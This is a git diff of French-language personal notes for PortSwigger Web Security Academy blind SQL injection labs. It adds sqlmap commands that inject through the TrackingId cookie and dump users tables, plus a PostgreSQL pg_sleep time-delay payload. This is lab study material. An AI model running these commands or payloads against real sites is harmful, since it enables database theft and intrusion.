@@ -59,7 +59,7 @@
     sqlmap -u URL -D DB -T TABLE --dump
     ```
 
-- [ ] Blind SQL injection with conditional responses
+- [X] Blind SQL injection with conditional responses
     
     SQLi dans un cookie :
     
@@ -70,13 +70,21 @@
         `sqlmap -u https://0a3700fb034bd637809b997f00c0000c.web-security-academy.net --level 3 --param-filter='COOKIE' --cookie='TrackingId=Po558KqESh0tBbOQ; session=Q4g1iOWrZkGDUZefNNOOqJRqpOXqKWY8' -D public -T users --dump`
     
 
-- [ ] Blind SQL injection with conditional errors
+- [X] Blind SQL injection with conditional errors
+
+    `sqlmap -u https://0a1000590442bc9a801fc67600f200ab.web-security-academy.net/ --level 3 --param-filter='COOKIE' --cookie='TrackingId=hW88IAKyNKdKynag; session=CCL1SGTI9xOkwZgLmrp1s8r2CsNJ6aao' -D PETER -T USERS --dump`
 
 - [ ] Visible error-based SQL injection
 
-- [ ] Blind SQL injection with time delays
+- [X] Blind SQL injection with time delays
+
+    `sqlmap -u https://0a20005903275bbc80e42bc700710057.web-security-academy.net/ --level 3 --risk 3 --param-filter='COOKIE' --cookie='TrackingId=33iPOvvWyVfcT3Di; session=dZhzxLd1oNXuUbKrImxt3IhY4dMNTUPp' --dbms=postgresql -D public -T users --dump`
+    
+    Ca marche mais l'exercice veut un delay de 10sec pour une base postgresql : `TrackingId=33iPOvvWyVfcT3Di' || pg_sleep(10)--`
 
 - [ ] Blind SQL injection with time delays and information retrieval
+
+    
 
 - [ ] Blind SQL injection with out-of-band interaction
 
